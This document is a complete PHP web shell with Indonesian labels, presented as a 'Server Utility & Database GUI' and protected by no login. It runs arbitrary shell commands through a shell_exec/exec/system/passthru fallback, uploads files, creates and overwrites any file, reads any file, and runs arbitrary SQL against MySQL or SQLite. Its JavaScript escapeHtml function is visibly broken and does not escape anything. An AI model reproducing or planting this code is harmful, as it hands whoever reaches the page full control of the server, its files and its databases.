<?php
// Navigasi Direktori File
$dir = isset($_GET['dir']) ? $_GET['dir'] : './';
$dir = realpath($dir);
if (!$dir || !is_dir($dir)) { $dir = realpath('./'); }

$pesanAksi = "";

// 0. PROSES DATABASE MANAGER (AJAX / POST)
if (isset($_POST['db_action'])) {
    header('Content-Type: application/json; charset=utf-8');
    $conn_type = $_POST['db_conn'] ?? 'mysql';
    $host      = $_POST['db_host'] ?? '127.0.0.1';
    $port      = $_POST['db_port'] ?? '3306';
    $db        = $_POST['db_name'] ?? '';
    $user      = $_POST['db_user'] ?? 'root';
    $pass      = $_POST['db_pass'] ?? '';
    $action    = $_POST['db_action'] ?? 'test';
    $query     = trim($_POST['db_query'] ?? '');
    $table     = $_POST['db_table'] ?? '';

    try {
        if ($conn_type === 'sqlite') {
            $pdo = new PDO("sqlite:" . $db);
        } else {
            $dsn = "mysql:host=$host;port=$port;charset=utf8mb4";
            if ($db !== '') $dsn .= ";dbname=$db";
            $pdo = new PDO($dsn, $user, $pass, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            ]);
        }

        if ($action === 'test') {
            echo json_encode(['ok' => true, 'message' => 'Koneksi Database Berhasil!']);
        } elseif ($action === 'tables') {
            if ($conn_type === 'sqlite') {
                $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
            } else {
                $stmt = $pdo->query("SHOW TABLES");
            }
            $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
            echo json_encode(['ok' => true, 'tables' => $tables]);
        } elseif ($action === 'browse' && !empty($table)) {
            // Ambil struktur kolom & data baris tabel
            $stmtCol = $pdo->query("DESCRIBE `$table`");
            $columns = $stmtCol->fetchAll(PDO::FETCH_ASSOC);

            $stmtRows = $pdo->query("SELECT * FROM `$table` LIMIT 100");
            $rows = $stmtRows->fetchAll(PDO::FETCH_ASSOC);

            // Cari kolom Primary Key
            $primaryKey = '';
            foreach ($columns as $col) {
                if ($col['Key'] === 'PRI') {
                    $primaryKey = $col['Field'];
                    break;
                }
            }

            echo json_encode([
                'ok' => true, 
                'table' => $table, 
                'columns' => $columns, 
                'rows' => $rows, 
                'primary_key' => $primaryKey,
                'count' => count($rows)
            ]);
        } elseif ($action === 'insert' && !empty($table)) {
            $data = $_POST['data'] ?? [];
            if (empty($data)) {
                echo json_encode(['ok' => false, 'error' => 'Data input kosong.']);
                exit;
            }
            $fields = array_keys($data);
            $placeholders = array_map(function($f) { return ":$f"; }, $fields);
            
            $sql = "INSERT INTO `$table` (`" . implode('`, `', $fields) . "`) VALUES (" . implode(', ', $placeholders) . ")";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($data);
            echo json_encode(['ok' => true, 'message' => 'Data berhasil ditambahkan!']);
        } elseif ($action === 'delete' && !empty($table)) {
            $pk = $_POST['pk_field'] ?? '';
            $id = $_POST['pk_value'] ?? '';
            if (empty($pk) || $id === '') {
                echo json_encode(['ok' => false, 'error' => 'Primary key tidak valid untuk hapus.']);
                exit;
            }
            $stmt = $pdo->prepare("DELETE FROM `$table` WHERE `$pk` = ?");
            $stmt->execute([$id]);
            echo json_encode(['ok' => true, 'message' => 'Baris berhasil dihapus.']);
        } elseif ($action === 'query') {
            if ($query === '') {
                echo json_encode(['ok' => false, 'error' => 'Query kosong.']);
                exit;
            }
            $stmt = $pdo->prepare($query);
            $stmt->execute();
            $isSelect = (stripos($query, 'SELECT') === 0 || stripos($query, 'SHOW') === 0 || stripos($query, 'DESCRIBE') === 0);
            if ($isSelect) {
                $rows = $stmt->fetchAll();
                $cols = count($rows) > 0 ? array_keys($rows[0]) : [];
                echo json_encode(['ok' => true, 'columns' => $cols, 'rows' => $rows, 'count' => count($rows)]);
            } else {
                echo json_encode(['ok' => true, 'affected' => $stmt->rowCount(), 'message' => 'Query berhasil dieksekusi. Affected rows: ' . $stmt->rowCount()]);
            }
        }
    } catch (Exception $e) {
        echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// 1. PROSES UPLOAD FILE
if (isset($_POST['submit_upload']) && isset($_FILES['berkas'])) {
    $targetPath = $dir . DIRECTORY_SEPARATOR . basename($_FILES['berkas']['name']);
    if (move_uploaded_file($_FILES['berkas']['tmp_name'], $targetPath)) {
        $pesanAksi = "<span style='color:#0f0;'>File berhasil diunggah ke: " . htmlspecialchars($targetPath) . "</span>";
    } else {
        $pesanAksi = "<span style='color:red;'>Gagal mengunggah file. Periksa izin folder.</span>";
    }
}

// 2. PROSES BUAT FILE BARU
if (isset($_POST['submit_buat_file'])) {
    $namaBaru = trim($_POST['nama_file_baru']);
    $isiBaru = $_POST['isi_file_baru'] ?? '';
    if (!empty($namaBaru)) {
        $pathBaru = $dir . DIRECTORY_SEPARATOR . basename($namaBaru);
        if (file_put_contents($pathBaru, $isiBaru) !== false) {
            $pesanAksi = "<span style='color:#0f0;'>File '$namaBaru' berhasil dibuat!</span>";
        } else {
            $pesanAksi = "<span style='color:red;'>Gagal membuat file baru.</span>";
        }
    }
}

// 3. PROSES SIMPAN EDIT FILE
if (isset($_POST['submit_simpan_edit'])) {
    $targetFileEdit = $_POST['path_file_edit'] ?? '';
    $isiEditBaru = $_POST['isi_file_edit'] ?? '';
    
    if (!empty($targetFileEdit) && file_exists($targetFileEdit) && is_file($targetFileEdit)) {
        if (file_put_contents($targetFileEdit, $isiEditBaru) !== false) {
            $pesanAksi = "<span style='color:#0f0;'>File berhasil disimpan!</span>";
        } else {
            $pesanAksi = "<span style='color:red;'>Gagal menyimpan perubahan file.</span>";
        }
    }
}

// 4. HELPER EKSEKUSI SHELL MULTI-FALLBACK
function run_cmd($cmd) {
    if (function_exists('shell_exec')) return shell_exec($cmd . " 2>&1");
    if (function_exists('exec')) { exec($cmd . " 2>&1", $out); return implode("\n", $out); }
    if (function_exists('system')) { ob_start(); system($cmd . " 2>&1"); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($cmd . " 2>&1"); return ob_get_clean(); }
    return "Error: Tidak ada fungsi eksekusi shell yang aktif di server ini.";
}

$outputShell = "";
$commandDijalankan = $_POST['command'] ?? '';
if (isset($_POST['submit_shell']) && !empty($commandDijalankan)) {
    $outputShell = htmlspecialchars(run_cmd("cd " . escapeshellarg($dir) . " && " . $commandDijalankan));
}

// Cek apakah sedang mode edit file
$modeEdit = false;
$fileTargetEdit = '';
$kontenFileEdit = '';
if (isset($_GET['edit'])) {
    $fileTargetEdit = realpath($_GET['edit']);
    if ($fileTargetEdit && is_file($fileTargetEdit)) {
        $modeEdit = true;
        $kontenFileEdit = file_get_contents($fileTargetEdit);
    }
}

// Cek apakah sedang mode buat file baru
$modeBuatBaru = isset($_GET['newfile']);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Server Utility & Database GUI</title>
    <style>
        body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; line-height: 1.5; }
        a { color: #4da6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; background: #1e1e1e; }
        th, td { border: 1px solid #333; padding: 8px 12px; text-align: left; }
        th { background: #252525; }
        input[type=text], input[type=password], input[type=file], textarea, select { background: #1e1e1e; color: #fff; border: 1px solid #444; padding: 8px; width: 100%; box-sizing: border-box; }
        button, .btn { background: #0066cc; color: #fff; border: none; padding: 6px 12px; cursor: pointer; border-radius: 3px; font-family: monospace; }
        button:hover, .btn:hover { background: #0052a3; }
        .btn-red { background: #cc0000; }
        .btn-red:hover { background: #a30000; }
        .btn-green { background: #009933; }
        .btn-green:hover { background: #007a29; }
        pre { background: #000; color: #00ff00; padding: 15px; border-radius: 4px; overflow-x: auto; }
        .card { background: #1e1e1e; border: 1px solid #333; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .actions-group { display: flex; gap: 5px; }
        .db-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; margin-bottom: 10px; }
        #dbOut { background:#08080a; border:1px solid #1e1e24; border-radius:6px; color:#7ee787; padding:12px; min-height:120px; max-height:50vh; overflow:auto; font-size:12px; margin-top: 10px; }
        table.db-table { width:100%; border-collapse:collapse; margin-top:8px; }
        table.db-table th, table.db-table td { border:1px solid #2a2a30; padding:6px 8px; font-size:11.5px; text-align:left; }
        table.db-table th { background:#141418; color:#9ad; }
        .table-list-badge { display: inline-block; background: #252530; border: 1px solid #3d3d4f; padding: 5px 10px; margin: 3px; border-radius: 4px; cursor: pointer; color: #7aa2f7; }
        .table-list-badge:hover { background: #33334d; }
    </style>
</head>
<body>

    <div style="display:flex; justify-content:space-between; align-items:center;">
        <h2>Web File & Database Manager</h2>
    </div>

    <?php if (!empty($pesanAksi)) echo "<div class='card'>p: $pesanAksi</div>"; ?>

    <!-- MODAL / FORM EDIT FILE -->
    <?php if ($modeEdit): ?>
    <div class="card" style="border-color: #0066cc;">
        <h3>Edit File: <?php echo htmlspecialchars(basename($fileTargetEdit)); ?></h3>
        <p><small><?php echo htmlspecialchars($fileTargetEdit); ?></small></p>
        <form method="post">
            <input type="hidden" name="path_file_edit" value="<?php echo htmlspecialchars($fileTargetEdit); ?>">
            <textarea name="isi_file_edit" rows="15" style="font-family:monospace;"><?php echo htmlspecialchars($kontenFileEdit); ?></textarea><br><br>
            <button type="submit" name="submit_simpan_edit" class="btn-green">💾 Simpan Perubahan</button>
            <a href="?dir=<?php echo urlencode(dirname($fileTargetEdit)); ?>" class="btn" style="background:#555;">Kembali</a>
        </form>
    </div>
    <?php endif; ?>

    <!-- FORM BUAT FILE BARU -->
    <?php if ($modeBuatBaru): ?>
    <div class="card" style="border-color: #009933;">
        <h3>Buat File Baru di: <?php echo htmlspecialchars($dir); ?></h3>
        <form method="post">
            <label>Nama File (contoh: <code>test.php</code> atau <code>index.php</code>):</label><br>
            <input type="text" name="nama_file_baru" placeholder="nama_file.php" required style="margin-bottom: 10px;"><br>
            <label>Isi File:</label><br>
            <textarea name="isi_file_baru" rows="10" placeholder="Tulis kode HTML/PHP di sini..." style="font-family:monospace; margin-bottom: 10px;"></textarea><br>
            <button type="submit" name="submit_buat_file" class="btn-green">✔ Buat File</button>
            <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#555;">Batal</a>
        </form>
    </div>
    <?php endif; ?>

    <!-- DATABASE MANAGER GUI (PHPMyAdmin-like) -->
    <div class="card">
        <h3>Database Manager (Klik & Browse)</h3>
        <div class="db-grid">
            <div>
                <label><small>DB_CONNECTION</small></label>
                <input id="db_conn" value="mysql">
            </div>
            <div>
                <label><small>DB_HOST</small></label>
                <input id="db_host" value="127.0.0.1">
            </div>
            <div>
                <label><small>DB_PORT</small></label>
                <input id="db_port" value="3306">
            </div>
            <div>
                <label><small>DB_DATABASE</small></label>
                <input id="db_name" placeholder="nama_db">
            </div>
            <div>
                <label><small>DB_USERNAME</small></label>
                <input id="db_user" value="root">
            </div>
            <div>
                <label><small>DB_PASSWORD</small></label>
                <input id="db_pass" type="password" placeholder="password">
            </div>
        </div>
        <div class="row" style="margin-bottom: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
            <button type="button" onclick="dbAction('test')" class="btn">Test Koneksi</button>
            <button type="button" onclick="dbAction('tables')" class="btn btn-green">📁 Lihat Daftar Tabel</button>
            <span id="dbStatus" class="meta" style="align-self: center; color: #aaa;"></span>
        </div>

        <div id="dbOut">Output database, daftar tabel, dan isi data tabel akan muncul di sini secara interaktif...</div>
    </div>

    <!-- TERMINAL SHELL -->
    <div class="card">
        <h3>Shell Command Terminal</h3>
        <form method="post">
            <input type="text" name="command" style="width: 70%; display:inline-block;" placeholder="Masukkan perintah (e.g. ls -la, pwd, whoami)" value="<?php echo htmlspecialchars($commandDijalankan); ?>" required>
            <button type="submit" name="submit_shell">Jalankan</button>
        </form>
        <div style="margin-top: 10px;">
            <small>Quick Commands: </small>
            <button type="button" onclick="setCmd('ls -la')">ls -la</button>
            <button type="button" onclick="setCmd('pwd')">pwd</button>
            <button type="button" onclick="setCmd('whoami')">whoami</button>
            <button type="button" onclick="setCmd('df -h')">df -h</button>
            <button type="button" onclick="setCmd('uname -a')">uname -a</button>
        </div>

        <?php if (!empty($outputShell)): ?>
            <h4>Output:</h4>
            <pre><?php echo $outputShell; ?></pre>
        <?php endif; ?>
    </div>

    <!-- FILE MANAGER & UPLOAD -->
    <div class="card">
        <h3>File Manager</h3>
        <p><b>Path Saat Ini:</b> <?php echo htmlspecialchars($dir); ?></p>
        
        <div style="margin-bottom: 15px; display:flex; gap: 10px; align-items: center; flex-wrap: wrap;">
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:5px; align-items:center;">
                <label>Upload:</label>
                <input type="file" name="berkas" required style="width: auto;">
                <button type="submit" name="submit_upload">Upload</button>
            </form>
            <a href="?dir=<?php echo urlencode($dir); ?>&newfile=1" class="btn btn-green">➕ Buat File Baru</a>
        </div>

        <table>
            <tr>
                <th>Nama File / Folder</th>
                <th>Tipe</th>
                <th>Ukuran</th>
                <th>Izin (Chmod)</th>
                <th>Aksi</th>
            </tr>
            <tr>
                <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>">📁 .. (Kembali)</a></td>
                <td>Folder</td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
            </tr>
            <?php
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($filePath);
                $perms = substr(sprintf('%o', fileperms($filePath)), -4);
                $size = $isDir ? '-' : number_format(filesize($filePath)) . ' B';
                
                echo "<tr>";
                if ($isDir) {
                    echo "<td><a href='?dir=" . urlencode($filePath) . "'>📁 $file</a></td><td>Folder</td><td>$size</td><td>$perms</td><td>-</td>";
                } else {
                    echo "<td>📄 $file</td><td>File</td><td>$size</td><td>$perms</td>";
                    echo "<td><div class='actions-group'>";
                    echo "<a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($filePath) . "' class='btn'>✏ Edit</a>";
                    echo "</div></td>";
                }
                echo "</tr>";
            }
            ?>
        </table>
    </div>

    <!-- INFORMASI SERVER -->
    <div class="card">
        <h3>Informasi Server</h3>
        <table>
            <tr><td><b>Host Name</b></td><td><?php echo $_SERVER['SERVER_NAME']; ?></td></tr>
            <tr><td><b>Server IP</b></td><td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Tidak terdeteksi'; ?></td></tr>
            <tr><td><b>Web Server</b></td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
            <tr><td><b>Versi PHP</b></td><td><?php echo phpversion(); ?></td></tr>
            <tr><td><b>User Web Server</b></td><td><?php echo run_cmd('whoami'); ?></td></tr>
            <tr><td><b>Document Root</b></td><td><?php echo $_SERVER['DOCUMENT_ROOT']; ?></td></tr>
            <tr><td><b>Upload Limits</b></td><td>upload_max: <?php echo ini_get('upload_max_filesize'); ?> | post_max: <?php echo ini_get('post_max_size'); ?></td></tr>
            <tr><td><b>OS Server</b></td><td><?php echo php_uname(); ?></td></tr>
        </table>
    </div>

    <script>
        function setCmd(cmd) {
            document.querySelector('input[name="command"]').value = cmd;
        }

        async function dbAction(action, extraData = {}) {
            const statusEl = document.getElementById('dbStatus');
            const outEl = document.getElementById('dbOut');
            
            statusEl.textContent = 'Memproses...';
            if (action !== 'browse' && action !== 'delete' && action !== 'insert') {
                outEl.textContent = 'Loading...';
            }

            const formData = new URLSearchParams();
            formData.append('db_action', action);
            formData.append('db_conn', document.getElementById('db_conn').value);
            formData.append('db_host', document.getElementById('db_host').value);
            formData.append('db_port', document.getElementById('db_port').value);
            formData.append('db_name', document.getElementById('db_name').value);
            formData.append('db_user', document.getElementById('db_user').value);
            formData.append('db_pass', document.getElementById('db_pass').value);

            for (const key in extraData) {
                formData.append(key, extraData[key]);
            }

            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const res = await response.json();
                
                if (!res.ok) {
                    statusEl.textContent = 'Gagal';
                    outEl.textContent = 'ERROR: ' + res.error;
                    return;
                }

                statusEl.textContent = 'Berhasil';
                if (action === 'test') {
                    outEl.textContent = res.message;
                } else if (action === 'tables') {
                    if (res.tables.length === 0) {
                        outEl.textContent = 'Database terhubung, tetapi belum ada tabel di dalamnya.';
                        return;
                    }
                    
                    outEl.innerHTML = '<b>Daftar Tabel (Klik untuk buka):</b><br><div id="tableBadgeContainer" style="margin-top:8px;"></div>';
                    const container = document.getElementById('tableBadgeContainer');
                    
                    res.tables.forEach(t => {
                        const badge = document.createElement('span');
                        badge.className = 'table-list-badge';
                        badge.innerHTML = '🗄️ ' + t;
                        badge.onclick = () => dbAction('browse', { db_table: t });
                        container.appendChild(badge);
                    });
                } else if (action === 'browse') {
                    let table = res.table;
                    let columns = res.columns;
                    let rows = res.rows;
                    let pk = res.primary_key;

                    let html = `<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">`;
                    html += `<span><b>Tabel:</b> ${table} (${res.count} baris ditampilkan)</span>`;
                    
                    const btnAdd = document.createElement('button');
                    btnAdd.className = 'btn btn-green';
                    btnAdd.style.cssText = 'padding:4px 8px; font-size:11px;';
                    btnAdd.textContent = '➕ Tambah Data';
                    btnAdd.onclick = () => showInsertForm(table, columns);

                    let headerDiv = document.createElement('div');
                    headerDiv.innerHTML = html;
                    headerDiv.querySelector('span').after(btnAdd);

                    if (rows.length === 0) {
                        headerDiv.innerHTML += `<p style="color:#aaa; margin-top:10px;">Tabel ini masih kosong (0 baris).</p>`;
                        outEl.innerHTML = '';
                        outEl.appendChild(headerDiv);
                    } else {
                        let tableHtml = `<div style="overflow-x:auto; margin-top:10px;"><table class="db-table"><tr>`;
                        columns.forEach(c => {
                            tableHtml += `<th>${c.Field} <small style="color:#888;">(${c.Type})</small></th>`;
                        });
                        if (pk) tableHtml += `<th>Aksi</th>`;
                        tableHtml += `</tr>`;

                        rows.forEach(row => {
                            tableHtml += `<tr>`;
                            columns.forEach(c => {
                                let val = row[c.Field];
                                tableHtml += `<td>${val !== null ? escapeHtml(String(val)) : '<span style="color:#777;">NULL</span>'}</td>`;
                            });
                            tableHtml += `</tr>`;
                        });
                        tableHtml += `</table></div>`;
                        
                        outEl.innerHTML = '';
                        outEl.appendChild(headerDiv);
                        outEl.insertAdjacentHTML('beforeend', tableHtml);

                        if (pk) {
                            const trs = outEl.querySelectorAll('table.db-table tr');
                            trs.forEach((tr, index) => {
                                if (index === 0) return;
                                const rowData = rows[index - 1];
                                const tdAction = document.createElement('td');
                                const delBtn = document.createElement('button');
                                delBtn.className = 'btn btn-red';
                                delBtn.style.cssText = 'padding:2px 6px; font-size:10px;';
                                delBtn.textContent = 'Hapus';
                                delBtn.onclick = () => deleteRow(table, pk, rowData[pk]);
                                tdAction.appendChild(delBtn);
                                tr.appendChild(tdAction);
                            });
                        }
                    }
                } else if (res.message) {
                    outEl.textContent = res.message;
                }
            } catch (e) {
                statusEl.textContent = 'Error';
                outEl.textContent = 'Gagal melakukan request AJAX ke server: ' + e.message;
            }
        }

        function showInsertForm(table, columns) {
            const outEl = document.getElementById('dbOut');
            outEl.innerHTML = `<h4>Tambah Data ke Tabel: ${table}</h4>`;
            
            const form = document.createElement('form');
            form.id = 'insertForm';
            form.onsubmit = (e) => submitInsert(e, table);

            columns.forEach(c => {
                if (c.Extra && c.Extra.includes('auto_increment')) return;
                const div = document.createElement('div');
                div.style.marginBottom = '6px';
                div.innerHTML = `<label style="font-size:11px;">${c.Field} (${c.Type})</label>`;
                
                const input = document.createElement('input');
                input.type = 'text';
                input.name = `data[${c.Field}]`;
                input.placeholder = `Nilai ${c.Field}`;
                div.appendChild(input);
                form.appendChild(div);
            });

            const submitBtn = document.createElement('button');
            submitBtn.type = 'submit';
            submitBtn.className = 'btn btn-green';
            submitBtn.style.marginTop = '5px';
            submitBtn.textContent = 'Simpan Data Baru';

            const cancelBtn = document.createElement('button');
            cancelBtn.type = 'button';
            cancelBtn.className = 'btn';
            cancelBtn.style.cssText = 'background:#555; margin-left:5px;';
            cancelBtn.textContent = 'Batal';
            cancelBtn.onclick = () => dbAction('browse', { db_table: table });

            form.appendChild(submitBtn);
            form.appendChild(cancelBtn);
            outEl.appendChild(form);
        }

        async function submitInsert(e, table) {
            e.preventDefault();
            const form = document.getElementById('insertForm');
            const formDataObj = new FormData(form);
            let extra = { db_table: table };
            for (let [key, value] of formDataObj.entries()) {
                extra[key] = value;
            }
            await dbAction('insert', extra);
            dbAction('browse', { db_table: table });
        }

        async function deleteRow(table, pkField, pkValue) {
            if (!confirm('Yakin ingin menghapus baris ini?')) return;
            await dbAction('delete', {
                db_table: table,
                pk_field: pkField,
                pk_value: pkValue
            });
            dbAction('browse', { db_table: table });
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&").replace(/</g, "<").replace(/>/g, ">").replace(/"/g, """).replace(/'/g, "'");
        }
    </script>
</body>
</html>
